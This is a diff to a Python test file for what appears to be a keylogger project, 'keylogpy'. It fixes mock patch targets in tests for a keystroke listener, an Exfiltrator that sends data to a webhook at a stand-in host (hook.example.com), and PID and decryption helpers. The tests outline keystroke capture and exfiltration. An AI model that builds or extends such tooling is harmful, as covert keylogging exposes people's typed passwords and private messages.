@@ -285,7 +285,7 @@ class TestKeyListener(unittest.TestCase):
     def test_start_creates_listener(self):
         mock_mgr = MagicMock()
         kl = KeyListener(mock_mgr)
-        with patch("keylogpy.Listener") as mock_listener:
+        with patch("pynput.keyboard.Listener") as mock_listener:
             kl.start()
             mock_listener.assert_called_once()
             mock_listener.return_value.start.assert_called_once()
@@ -366,14 +366,15 @@ class TestExfiltrator(unittest.TestCase):
 
     def test_webhook_send(self):
         exf = Exfiltrator(self.config, self.crypto)
-        with patch("keylogpy.requests.post") as mock_post:
+        with patch("requests.post") as mock_post:
             mock_post.return_value.status_code = 200
             exf._webhook_send("https://hook.example.com", b"test data")
             mock_post.assert_called_once()
 
     def test_webhook_send_failure_logged(self):
+        import requests
         exf = Exfiltrator(self.config, self.crypto)
-        with patch("keylogpy.requests.post", side_effect=Exception("net error")):
+        with patch("requests.post", side_effect=requests.RequestException("net error")):
             try:
                 exf._webhook_send("https://hook.example.com", b"test")
             except Exception:
@@ -502,7 +503,7 @@ class TestKeyLogPyApp(unittest.TestCase):
         app = KeyLogPyApp(self.config)
         app._write_pid()
         app._remove_pid()
-        self.assertFalse(Path(self.tmpdir) / "keylogpy.pid").exists()
+        self.assertFalse((Path(self.tmpdir) / "keylogpy.pid").exists())
 
     def test_decrypt_file(self):
         app = KeyLogPyApp(self.config)
